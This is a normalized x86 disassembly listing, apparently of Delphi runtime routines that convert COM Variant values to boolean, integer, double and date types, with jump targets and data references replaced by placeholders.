jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410150
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40feec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410098
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e49c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410104
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40feec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_40feec
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4103a7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff98
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410150
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410594
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41064b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412714
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_40821c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410652
lea eax [ ebp - 0x10 ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_4045cc
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40e930
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40e930
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_41065c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40e930
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_41069c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4106f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40effc
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_41074c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4106f7
lea eax [ ebp - 0x11 ]
call sub_40ecd4
retn
sub_410700
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_41074c
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410766 ]
mov eax ebx
call sub_410594
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410594
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_41074c
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_41065c
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_41069c
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e49c
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410700
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41065c
mov [ esp ] al
mov eax ebx
call sub_41065c
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410928 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410594
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_41074c
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410aa0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410b55
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412714
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404174
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409408
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40e930
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40e930
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b5c
lea eax [ ebp - 0x1c ]
call sub_403eec
lea eax [ ebp - 0xc ]
call sub_4045cc
retn
sub_410b64
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40e930
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410bb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410c05
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40effc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410c60
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c0c
lea eax [ ebp - 0x18 ]
call sub_40ecd4
retn
sub_410c14
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410c60
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410c7c ]
mov eax ebx
call sub_410aa0
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410aa0
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c60
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410b64
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410bb0
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e49c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410c14
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410b64
fstp [ esp ]
fwait
mov eax ebx
call sub_410b64
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410e59 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410aa0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c60
fstp [ esp ]
fwait
jmp r-xdata
sub_410ff8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_41115d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410c60
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41101a ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e49c
sub_411188
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411264
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412714
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404174
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40ae10
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41126b
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0xc ]
call sub_4045cc
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404174
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409424
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40e930
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40e930
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411274
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e930
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4112d4
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e930
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411320
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411375
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40effc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4113d0
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41137c
lea eax [ ebp - 0x18 ]
call sub_40ecd4
retn
sub_411384
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4113d0
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4113ec ]
mov eax ebx
call sub_411188
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4112d4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411188
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411274
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4113d0
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4112d4
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411320
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e49c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411384
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4112d4
fstp [ esp ]
fwait
mov eax ebx
call sub_4112d4
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4115b7 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4112d4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411188
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
